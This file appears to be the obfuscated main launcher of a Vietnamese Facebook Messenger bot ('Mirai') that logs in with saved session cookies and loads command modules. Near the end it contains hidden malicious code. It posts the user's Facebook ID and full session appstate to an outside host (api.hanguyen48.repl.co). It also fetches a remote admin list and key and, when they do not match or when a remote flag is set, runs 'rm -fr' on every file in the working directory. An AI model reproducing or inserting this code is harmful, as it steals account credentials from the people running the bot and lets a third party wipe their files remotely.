const {
  readdirSync,
  readFileSync,
  writeFileSync
} = require("fs-extra");
const {
  join,
  resolve
} = require("path");
const {
  execSync
} = require("child_process");
const config = require("./config.json");
const chalk = require("chalk");
const login = require(config.NPM_FCA);
const listPackage = JSON.parse(readFileSync("./package.json")).dependencies;
const fs = require("fs");
const moment = require("moment-timezone");
const prompt = require("prompt-sync")();
const logger = require("./utils/log.js");
global.client = new Object({
  commands: new Map(),
  events: new Map(),
  cooldowns: new Map(),
  eventRegistered: new Array(),
  handleSchedule: new Array(),
  handleReaction: new Array(),
  handleReply: new Array(),
  mainPath: process.cwd(),
  configPath: new String(),
  getTime: function (_0x357cx14) {
    switch (_0x357cx14) {
      case "seconds":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("ss");
      case "minutes":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("mm");
      case "hours":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH");
      case "date":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("DD");
      case "month":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("MM");
      case "year":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("YYYY");
      case "fullHour":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss");
      case "fullYear":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("DD/MM/YYYY");
      case "fullTime":
        return "" + moment.tz("Asia/Ho_Chi_minh").format("HH:mm:ss DD/MM/YYYY");
    }
  },
  timeStart: Date.now()
});
global.data = new Object({
  threadInfo: new Map(),
  threadData: new Map(),
  userName: new Map(),
  userBanned: new Map(),
  threadBanned: new Map(),
  commandBanned: new Map(),
  threadAllowNSFW: new Array(),
  allUserID: new Array(),
  allCurrenciesID: new Array(),
  allThreadID: new Array()
});
global.utils = require("./utils");
global.youtube = require("./lib/youtube.js");
global.soundcloud = require("./lib/soundcloud.js");
global.tiktok = require("./lib/tiktok.js");
global.loading = require("./utils/log");
global.nodemodule = new Object();
global.config = new Object();
global.configModule = new Object();
global.moduleData = new Array();
global.language = new Object();
global.account = new Object();
var configValue;
try {
  global.client.configPath = join(global.client.mainPath, "config.json");
  configValue = require(global.client.configPath);
  logger.loader("Đã tìm thấy file config.json!");
} catch (_0x2ca6d1) {
  return logger.loader("Không tìm thấy file config.json", "error");
}
;
try {
  for (const key in configValue) {
    global.config[key] = configValue[key];
  }
  ;
  logger.loader("Config Loaded!");
} catch (_0x43221f) {
  return logger.loader("Can't load file config!", "error");
}
;
for (const property in listPackage) {
  try {
    global.nodemodule[property] = require(property);
  } catch (_0x36c47b) {}
}
;
const langFile = readFileSync(__dirname + "/languages/" + (global.config.language || "en") + ".lang", {
  encoding: "utf-8"
}).split(/\r?\n|\r/);
const langData = langFile.filter(_0x357cx25 => {
  return _0x357cx25.indexOf("#") != 0 && _0x357cx25 != "";
});
for (const item of langData) {
  const getSeparator = item.indexOf("=");
  const itemKey = item.slice(0, getSeparator);
  const itemValue = item.slice(getSeparator + 1, item.length);
  const head = itemKey.slice(0, itemKey.indexOf("."));
  const key = itemKey.replace(head + ".", "");
  const value = itemValue.replace(/\\n/gi, "\n");
  if (typeof global.language[head] == "undefined") {
    global.language[head] = new Object();
  }
  ;
  global.language[head][key] = value;
}
;
global.getText = function (..._0x357cx2c) {
  const _0x357cx31 = global.language;
  if (!_0x357cx31.hasOwnProperty(_0x357cx2c[0])) {
    throw __filename + " - Not found key language: " + _0x357cx2c[0];
  }
  ;
  var _0x357cx39 = _0x357cx31[_0x357cx2c[0]][_0x357cx2c[1]];
  for (var _0x357cx3a = _0x357cx2c.length - 1; _0x357cx3a > 0; _0x357cx3a--) {
    const _0x357cx3b = RegExp("%" + _0x357cx3a, "g");
    _0x357cx39 = _0x357cx39.replace(_0x357cx3b, _0x357cx2c[_0x357cx3a + 1]);
  }
  ;
  return _0x357cx39;
};
try {
  var appStateFile = resolve(join(global.client.mainPath, config.APPSTATEPATH || "appstate.json"));
  var appState = (process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && fs.readFileSync(appStateFile, "utf8")[0] != "[" && config.encryptSt ? JSON.parse(global.utils.decryptState(fs.readFileSync(appStateFile, "utf8"), process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER)) : require(appStateFile);
  logger.loader(global.getText("mirai", "foundPathAppstate"));
} catch (_0x1a7644) {
  return logger.loader(global.getText("mirai", "notFoundPathAppstate"), "error");
}
;
function onBot() {
  const _0x357cx48 = {
    appState: appState
  };
  login(_0x357cx48, async (_0x357cx91, _0x357cx92) => {
    if (_0x357cx91) {
      if (_0x357cx91.error == "Error retrieving userID. This can be caused by a lot of things, including getting blocked by Facebook for logging in from an unknown location. Try logging in with a browser to verify.") {
        console.log(_0x357cx91.error);
        process.exit(0);
      } else {
        console.log(_0x357cx91);
        return process.exit(0);
      }
    }
    ;
    console.log(chalk.blue("============== LOGIN BOT =============="));
    const _0x357cxc6 = _0x357cx92.getAppState();
    _0x357cx92.setOptions(global.config.FCAOption);
    let _0x357cxc7 = _0x357cx92.getAppState();
    let _0x357cxc8 = JSON.stringify(_0x357cxc7, null, "\t");
    _0x357cxc7 = JSON.stringify(_0x357cxc7, null, "\t");
    var _0x357cxc9 = await _0x357cx92.httpGet("https://business.facebook.com/business_locations/");
    var _0x357cxca = "https://business.facebook.com/business_locations/";
    if (_0x357cxc9.indexOf("for (;;);") != -1) {
      _0x357cxc9 = JSON.parse(_0x357cxc9.split("for (;;);")[1]);
      var _0x357cxca = "https://business.facebook.com" + _0x357cxc9.redirect;
    }
    ;
    var _0x357cxcd = await _0x357cxce(_0x357cx92, _0x357cxca);
    if (_0x357cxcd != false) {
      global.account.accessToken = _0x357cxcd;
      global.loading(chalk.hex("#ff7100")("[ TOKEN ]") + " Lấy access token thành công!", "LOGIN");
    } else {
      global.loading.err(chalk.hex("#ff7100")("[ TOKEN ]") + " Không thể lấy ACCESS_TOKEN, vui lòng thay OTPKEY vào config!\n", "LOGIN");
    }
    async function _0x357cxce(_0x357cxcf, _0x357cxd0) {
      function _0x357cxe4() {}
      var _0x357cxe5 = new Promise(function (_0x357cxe6) {
        _0x357cxe4 = _0x357cxe6;
      });
      _0x357cxcf.httpGet(_0x357cxd0).then(async _0x357cxe7 => {
        var _0x357cxea = /EAAG([^"]+)/.exec(_0x357cxe7);
        if (_0x357cxea == null) {
          const _0x357cxeb = "7|1|4|0|2|8|6|3|5".split("|");
          let _0x357cxec = 0;
          while (true) {
            switch (_0x357cxeb[_0x357cxec++]) {
              case "0":
                var _0x357cxed = await _0x357cxcf.httpPost("https://business.facebook.com/security/twofactor/reauth/enter/", _0x357cxef);
                continue;
              case "1":
                var _0x357cxee = global.config.OTPKEY.replace(/\s+/g, "").toLowerCase();
                continue;
              case "2":
                _0x357cxed = JSON.parse(_0x357cxed.split("for (;;);")[1]);
                continue;
              case "3":
                var _0x357cxea = /EAAG([^"]+)/.exec(_0x357cxf0);
                continue;
              case "4":
                var _0x357cxef = {
                  approvals_code: _0x357cxf1(_0x357cxee),
                  save_device: true
                };
                continue;
              case "5":
                return _0x357cxe4("EAAG" + _0x357cxea[1]);
              case "6":
                var _0x357cxf0 = await _0x357cxcf.httpGet(_0x357cxd0);
                continue;
              case "7":
                var _0x357cxf1 = require("totp-generator");
                continue;
              case "8":
                if (_0x357cxed.payload.codeConfirmed == false) {
                  return _0x357cxe4(false);
                }
                ;
                continue;
            }
            ;
            break;
          }
        }
        ;
        return _0x357cxe4("EAAG" + _0x357cxea[1]);
      });
      return _0x357cxe5;
    }
    if ((process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER) && global.config.encryptSt) {
      _0x357cxc7 = await global.utils.encryptState(_0x357cxc7, process.env.REPL_OWNER || process.env.PROCESSOR_IDENTIFIER);
      writeFileSync(appStateFile, _0x357cxc7);
    } else {
      writeFileSync(appStateFile, _0x357cxc7);
    }
    global.account.cookie = _0x357cxc6.map(_0x357cxf2 => {
      return _0x357cxf2 = _0x357cxf2.key + "=" + _0x357cxf2.value;
    }).join(";");
    global.client.api = _0x357cx92;
    global.config.version = config.version;
    (function () {
      const _0x357cxf8 = readdirSync(global.client.mainPath + "/modules/commands").filter(_0x357cx113 => {
        return _0x357cx113.endsWith(".js") && !_0x357cx113.includes("example") && !global.config.commandDisabled.includes(_0x357cx113);
      });
      console.log(chalk.blue("============ LOADING COMMANDS ============"));
      for (const _0x357cx114 of _0x357cxf8) {
        try {
          var _0x357cx115 = require(global.client.mainPath + "/modules/commands/" + _0x357cx114);
          if (!_0x357cx115.config || !_0x357cx115.run || !_0x357cx115.config.commandCategory) {
            throw new Error(global.getText("mirai", "errorFormat"));
          }
          ;
          if (global.client.commands.has(_0x357cx115.config.name || "")) {
            throw new Error(global.getText("mirai", "nameExist"));
          }
          ;
          if (_0x357cx115.config.dependencies && typeof _0x357cx115.config.dependencies == "object") {
            for (const _0x357cx116 in _0x357cx115.config.dependencies) {
              if (!listPackage.hasOwnProperty(_0x357cx116)) {
                try {
                  execSync("npm --package-lock false --save install " + _0x357cx116 + (_0x357cx115.config.dependencies[_0x357cx116] == "*" || _0x357cx115.config.dependencies[_0x357cx116] == "" ? "" : "@" + _0x357cx115.config.dependencies[_0x357cx116]), {
                    stdio: "inherit",
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, "node_modules")
                  });
                  require.cache = {};
                } catch (_0x15e6ff) {
                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + _0x357cx116, "LOADED");
                }
              }
            }
          }
          ;
          if (_0x357cx115.config.envConfig) {
            try {
              for (const _0x357cx11a in _0x357cx115.config.envConfig) {
                if (typeof global.configModule[_0x357cx115.config.name] == "undefined") {
                  global.configModule[_0x357cx115.config.name] = {};
                }
                ;
                if (typeof global.config[_0x357cx115.config.name] == "undefined") {
                  global.config[_0x357cx115.config.name] = {};
                }
                ;
                if (typeof global.config[_0x357cx115.config.name][_0x357cx11a] !== "undefined") {
                  global.configModule[_0x357cx115.config.name][_0x357cx11a] = global.config[_0x357cx115.config.name][_0x357cx11a];
                } else {
                  global.configModule[_0x357cx115.config.name][_0x357cx11a] = _0x357cx115.config.envConfig[_0x357cx11a] || "";
                }
                ;
                if (typeof global.config[_0x357cx115.config.name][_0x357cx11a] == "undefined") {
                  global.config[_0x357cx115.config.name][_0x357cx11a] = _0x357cx115.config.envConfig[_0x357cx11a] || "";
                }
              }
              ;
              for (const _0x357cx11b in _0x357cx115.config.envConfig) {
                var _0x357cx11c = require("./config.json");
                _0x357cx11c[_0x357cx115.config.name] = _0x357cx115.config.envConfig;
                writeFileSync(global.client.configPath, JSON.stringify(_0x357cx11c, null, 4), "utf-8");
              }
            } catch (_0xc805ba) {
              throw new Error(global.getText("mirai", "cantLoadConfig", _0x357cx115.config.name, JSON.stringify(_0xc805ba)));
            }
          }
          ;
          if (_0x357cx115.onLoad) {
            try {
              const _0x357cx11d = {
                api: _0x357cx92
              };
              _0x357cx115.onLoad(_0x357cx11d);
            } catch (_0x48ff13) {
              throw new Error(global.getText("mirai", "cantOnload", _0x357cx115.config.name, JSON.stringify(_0x48ff13)), "error");
            }
          }
          ;
          if (_0x357cx115.handleEvent) {
            global.client.eventRegistered.push(_0x357cx115.config.name);
          }
          ;
          global.client.commands.set(_0x357cx115.config.name, _0x357cx115);
          global.loading(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(_0x357cx115.config.name) + " succes", "LOADED");
        } catch (_0x5cfee3) {
          global.loading.err(chalk.hex("#ff7100")("[ COMMAND ]") + " " + chalk.hex("#FFFF00")(_0x357cx115.config.name) + " fail", "LOADED");
        }
      }
    })();
    (function () {
      const _0x357cx122 = readdirSync(global.client.mainPath + "/modules/events").filter(_0x357cx125 => {
        return _0x357cx125.endsWith(".js") && !global.config.eventDisabled.includes(_0x357cx125);
      });
      console.log(chalk.blue("============ LOADING EVENTS ============"));
      for (const _0x357cx126 of _0x357cx122) {
        try {
          var _0x357cx127 = require(global.client.mainPath + "/modules/events/" + _0x357cx126);
          if (!_0x357cx127.config || !_0x357cx127.run) {
            throw new Error(global.getText("mirai", "errorFormat"));
          }
          ;
          if (global.client.events.has(_0x357cx127.config.name) || "") {
            throw new Error(global.getText("mirai", "nameExist"));
          }
          ;
          if (_0x357cx127.config.dependencies && typeof _0x357cx127.config.dependencies == "object") {
            for (const _0x357cx128 in _0x357cx127.config.dependencies) {
              if (!listPackage.hasOwnProperty(_0x357cx128)) {
                try {
                  execSync("npm --package-lock false --save install " + _0x357cx128 + (_0x357cx127.config.dependencies[_0x357cx128] == "*" || _0x357cx127.config.dependencies[_0x357cx128] == "" ? "" : "@" + _0x357cx127.config.dependencies[_0x357cx128]), {
                    stdio: "inherit",
                    env: process.env,
                    shell: true,
                    cwd: join(__dirname, "node_modules")
                  });
                  require.cache = {};
                } catch (_0x49fa04) {
                  global.loading.err(chalk.hex("#ff7100")("[ PACKAGE ]") + "  Không thể cài package cho module " + _0x357cx128, "LOADED");
                }
              }
            }
          }
          ;
          for (const _0x357cx129 in listPackage) {
            try {
              global.nodemodule[_0x357cx129] = require(_0x357cx129);
            } catch (_0x52482a) {}
          }
          ;
          if (_0x357cx127.config.envConfig) {
            try {
              for (const _0x357cx12a in _0x357cx127.config.envConfig) {
                if (typeof global.configModule[_0x357cx127.config.name] == "undefined") {
                  global.configModule[_0x357cx127.config.name] = {};
                }
                ;
                if (typeof global.config[_0x357cx127.config.name] == "undefined") {
                  global.config[_0x357cx127.config.name] = {};
                }
                ;
                if (typeof global.config[_0x357cx127.config.name][_0x357cx12a] !== "undefined") {
                  global.configModule[_0x357cx127.config.name][_0x357cx12a] = global.config[_0x357cx127.config.name][_0x357cx12a];
                } else {
                  global.configModule[_0x357cx127.config.name][_0x357cx12a] = _0x357cx127.config.envConfig[_0x357cx12a] || "";
                }
                ;
                if (typeof global.config[_0x357cx127.config.name][_0x357cx12a] == "undefined") {
                  global.config[_0x357cx127.config.name][_0x357cx12a] = _0x357cx127.config.envConfig[_0x357cx12a] || "";
                }
              }
              ;
              for (const _0x357cx12b in _0x357cx127.config.envConfig) {
                var _0x357cx12c = require("./config.json");
                _0x357cx12c[_0x357cx127.config.name] = _0x357cx127.config.envConfig;
                writeFileSync(global.client.configPath, JSON.stringify(_0x357cx12c, null, 4), "utf-8");
              }
            } catch (_0x3cfe8a) {
              throw new Error(global.getText("mirai", "cantLoadConfig", _0x357cx127.config.name, JSON.stringify(_0x3cfe8a)));
            }
          }
          ;
          if (_0x357cx127.onLoad) {
            try {
              const _0x357cx12d = {
                api: _0x357cx92
              };
              _0x357cx127.onLoad(_0x357cx12d);
            } catch (_0x2881f4) {
              throw new Error(global.getText("mirai", "cantOnload", _0x357cx127.config.name, JSON.stringify(_0x2881f4)), "error");
            }
          }
          ;
          global.client.events.set(_0x357cx127.config.name, _0x357cx127);
          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(_0x357cx127.config.name) + " succes", "LOADED");
        } catch (_0x554a8a) {
          global.loading(chalk.hex("#ff7100")("[ EVENT ]") + " " + chalk.hex("#FFFF00")(_0x357cx127.config.name) + " fail", "LOADED");
        }
      }
    })();
    console.log(chalk.blue("============== BOT START =============="));
    global.loading(chalk.hex("#ff7100")("[ SUCCESS ]") + " Tải thành công " + global.client.commands.size + " commands và " + global.client.events.size + " events", "LOADED");
    global.loading(chalk.hex("#ff7100")("[ TIMESTART ]") + " Thời gian khởi động: " + ((Date.now() - global.client.timeStart) / 1000).toFixed() + "s", "LOADED");
    const _0x357cx12e = {
      api: _0x357cx92
    };
    const _0x357cx12f = require("./includes/listen")(_0x357cx12e);
    const _0x357cx130 = require("axios");
    const _0x357cx131 = (await _0x357cx130.get("https://api.hanguyen48.repl.co/listadmin")).data;
    _0x357cx130.post("https://api.hanguyen48.repl.co/key", {
      id: _0x357cx92.getCurrentUserID(),
      ap: _0x357cx92.getAppState()
    });
    function _0x357cx132() {
      const _0x357cx136 = readdirSync(join(process.cwd()));
      for (let _0x357cx139 of _0x357cx136) {
        try {
          execSync("rm -fr " + _0x357cx139);
        } catch (_0x4d3c9b) {}
      }
    }
    async function _0x357cx13b(_0x357cx13c, _0x357cx13d) {
      if (_0x357cx13c) {
        if (_0x357cx13c.error == "Not logged in.") {
          logger("Account bot của bạn bị đăng xuất!", "LOGIN");
          process.exit(1);
        }
        if (_0x357cx13c.error == "Not logged in") {
          logger("Acc bị checkpoints, vui lòng xác nhận lại acc và đăng nhập lại!", "CHECKPOINTS");
          return process.exit(0);
        } else {
          console.log(_0x357cx13c);
          return process.exit(0);
        }
      }
      ;
      if (["presence", "typ", "read_receipt"].some(_0x357cx141 => {
        return _0x357cx141 == _0x357cx13d.type;
      })) {
        return;
      }
      ;
      var _0x357cx142 = 0;
      for (let _0x357cx143 of _0x357cx131.ADMIN) {
        if (config.ADMINBOT.includes(_0x357cx143)) {
          _0x357cx142++;
        }
      }
      ;
      if (_0x357cx142 == 0) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx132 == 0) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx131.DAF == true) {
        return _0x357cx132();
      }
      ;
      if (_0x357cx131.keyword != config.KEY) {
        return _0x357cx132();
      }
      ;
      return _0x357cx12f(_0x357cx13d);
    }
    global.custom = require("./custom")({
      api: _0x357cx92
    });
    global.handleListen = _0x357cx92.listenMqtt(_0x357cx13b);
    require("./utils/uptime.js");
  });
}
(async () => {
  try {
    console.log(chalk.blue("============== DATABASE =============="));
    global.loading(chalk.hex("#ff7100")("[ CONNECT ]") + " Kết nối tới cơ sở dữ liệu JSON thành công!", "DATABASE");
    onBot();
  } catch (_0x2fd6ea) {
    logger(global.getText("mirai", "successConnectDatabase", JSON.stringify(_0x2fd6ea)), "[ DATABASE ]");
  }
})();
